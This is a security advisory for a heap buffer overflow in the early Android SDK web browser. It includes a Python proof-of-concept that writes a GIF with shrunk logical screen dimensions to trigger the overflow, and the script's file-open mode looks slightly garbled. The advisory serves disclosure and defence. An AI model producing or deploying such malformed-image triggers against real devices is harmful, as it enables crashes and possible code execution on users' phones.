source: https://www.securityfocus.com/bid/28005/info

Android Web Browser is prone to a heap-based buffer-overflow vulnerability because it fails to adequately bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.

Successfully exploiting this vulnerability can allow remote attackers to execute arbitrary machine code in the context of the application. Failed attempts will likely result in denial-of-service conditions.

This issue affects Android SDK m3-rc37a and earlier.

##Android Heap Overflow
##Ortega Alfredo _ Core Security Exploit Writers Team
##tested against Android SDK m3-rc37a

import Image
import struct

#Creates a _good_ gif image
imagename='overflow.gif'
str = '\x00\x00\x00\x00'*30000
im = Image.frombuffer('L',(len(str),1),str,'raw','L',0,1)
im.save(imagename,'GIF')

#Shrink the Logical screen dimension
SWidth=1
SHeight=1

img = open(imagename,'rb').read()
img = img[:6]+struct.pack('<HH',SWidth,SHeight)+img[10:]

#Save the _bad_ gif image
q=open(imagename,'wb=""')
q.write(img)
q.close()